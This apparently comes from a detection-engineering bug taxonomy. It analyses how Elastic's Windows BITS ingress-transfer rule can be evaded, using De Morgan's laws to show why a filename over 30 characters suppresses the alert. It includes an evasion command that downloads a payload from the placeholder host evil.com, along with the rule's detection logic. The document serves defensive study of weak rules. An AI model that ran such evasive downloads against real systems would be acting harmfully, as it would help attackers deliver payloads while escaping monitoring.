# ADE4-01 Example: Windows BITS Gate Inversion via De Morgan's Laws

**Bug Category:** ADE4-01 Logic Manipulation - Gate Inversion

**Related Bugs:**
- ADE2-04 Omit Alternatives - File Type ([see example](../ade2/bits-ingress-transfer.md))
- ADE3-02 Context Development - Aggregation Hijacking ([see example](../ade3/bits-filename-manipulation.md))

## Original Rule

**Source:** [Elastic Security - Ingress Transfer via Windows BITS](https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_ingress_transfer_bits.toml)

**Description:** Identifies downloads of executable and archive files via the Windows Background Intelligent Transfer Service (BITS). Adversaries could leverage Windows BITS transfer jobs to download remote payloads.

```SQL
query = '''
file where host.os.type == "windows" and event.action == "rename" and
  process.name : "svchost.exe" and file.Ext.original.name : "BIT*.tmp" and
  (file.extension : ("exe", "zip", "rar", "bat", "dll", "ps1", "vbs", "wsh", "js", "vbe", "pif", "scr", "cmd", "cpl") or
   file.Ext.header_bytes : "4d5a*") and

  /* noisy paths, for hunting purposes you can use the same query without the following exclusions */
  not file.path : ("?:\\Program Files\\*", "?:\\Program Files (x86)\\*", "?:\\Windows\\*", "?:\\ProgramData\\*\\*") and

  /* lot of third party SW use BITS to download executables with a long file name */
  not length(file.name) > 30 and
  not file.path : (
        "?:\\Users\\*\\AppData\\Local\\Temp*\\wct*.tmp",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\RdrServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Adobe\\ARM\\*\\AcroServicesUpdater*.exe",
        "?:\\Users\\*\\AppData\\Local\\Docker Desktop Installer\\update-*.exe"
  )
'''
```

## Detection Logic Analysis

**Relevant negation chain:**
```SQL
not file.path : ("?:\\Program Files\\*", ...) and
not length(file.name) > 30 and
not file.path : ("?:\\Users\\*\\AppData\\Local\\Temp*\\wct*.tmp", ...)
```

**Simplified structure:**
```SQL
not A and not B and not C
```

## The Bug: ADE4-01 Logic Manipulation - Gate Inversion

**Definition:** Detection logic includes NOT clauses that can be inverted using [De Morgan's Laws](https://en.wikipedia.org/wiki/De_Morgan%27s_laws).

### De Morgan's Laws

**Law 1:**
```
NOT A AND NOT B  ⟺  NOT (A OR B)
```

**Law 2:**
```
NOT A OR NOT B  ⟺  NOT (A AND B)
```

### Applied to This Rule

**Current logic:**
```SQL
not file.path : ("Program Files") and
not length(file.name) > 30 and
not file.path : ("specific paths")
```

**Equivalent (by De Morgan's Law):**
```SQL
not (
    file.path : ("Program Files") or
    length(file.name) > 30 or
    file.path : ("specific paths")
)
```

**Meaning:** The entire negation chain fails if **ANY** condition is true.

**Attack surface:** Attacker can manipulate `length(file.name)` to bypass **all** exclusions.

## Bypass - Filename Length Manipulation

**Based on De Morgan's Laws:**

The logic:
```SQL
not length(file.name) > 30 and not file.path : (...)
```

Relies on the file length condition to be `false` (filename ≤30 characters) in order to evaluate the remaining exclusion conditions.

**Attack:**

Use filename longer than 30 characters:

```PowerShell
Import-Module BitsTransfer
Start-BitsTransfer -Source "https://evil.com/payload.exe" `
                   -Destination "C:\Users\Public\this_is_a_very_long_filename_to_bypass_detection.exe"
```

**Result:**

1. **Selection conditions:** All satisfied
   - `file.Ext.original.name : "BIT*.tmp"` ✓
   - `file.extension : "exe"` ✓

2. **First negation:** `not file.path : ("Program Files")` → `true` (not in Program Files)

3. **Second negation:** `not length(file.name) > 30`
   - Filename: `this_is_a_very_long_filename_to_bypass_detection.exe` (50 characters)
   - Length > 30 → `true`
   - `not true` → `false`

4. **Entire negation chain:**
   - `not A and not B and not C`
   - `true and false and ...`
   - Result: `false`

5. **Final logic:** `selection and (not A and not B and not C)`
   - `true and false`
   - Result: `false` → **No alert**

## Why This Is Gate Inversion

**Gate inversion via De Morgan's Laws:**

The detection rule author likely didn't consider that:

```SQL
not A and not B and not C
```

Can be simplified to:

```SQL
not (A or B or C)
```

**Implication:** If **any single condition** (A, B, or C) is true, the **entire negation chain** fails.

**Attack:** Attacker manipulates one mutable field (`file.name` length) to flip the Boolean gate for the entire exclusion block.

## Difference from ADE3-02

**ADE3-02 (Aggregation Hijacking):**
- Attacker manipulates aggregated values to match baseline
- Focuses on **context development** (fitting into expected patterns)

**ADE4-01 (Gate Inversion):**
- Attacker flips Boolean logic using De Morgan's Laws
- Focuses on **logic manipulation** (exploiting negation structure)

**Same technique, different categorization:**
- Filename >30 is an **aggregation hijacking** tactic (matching third-party software baseline)
- **AND** a **gate inversion** bug (inverting conjuncted negations)

This is an example of **stacked bugs** - same bypass exploits multiple bug categories.

## Impact

**Stacked bugs in this rule:**

1. **ADE2-04:** Omit Alternatives - File Type
   - Missing .7z, .gz, .py, macro-enabled Office docs
   - [See example](../ade2/bits-ingress-transfer.md)

2. **ADE3-02:** Aggregation Hijacking
   - Filename >30 characters matches third-party software pattern
   - [See example](../ade3/bits-filename-manipulation.md)

3. **ADE4-01:** Gate Inversion (this example)
   - Filename >30 inverts entire negation chain via De Morgan's Laws

**Combined impact:** Multiple independent bypass paths.

---

**Related Documentation:**
- [ADE4 Logic Manipulation](../../docs/taxonomy/ade4-logic-manipulation.md)
- [ADE4-01 Gate Inversion](../../docs/taxonomy/ade4-logic-manipulation.md#ade4-01-logic-manipulation---gate-inversion)
- [De Morgan's Laws](https://en.wikipedia.org/wiki/De_Morgan%27s_laws)
- [ADE2-04 File Type Omission](../ade2/bits-ingress-transfer.md)
- [ADE3-02 Aggregation Hijacking](../ade3/bits-filename-manipulation.md)
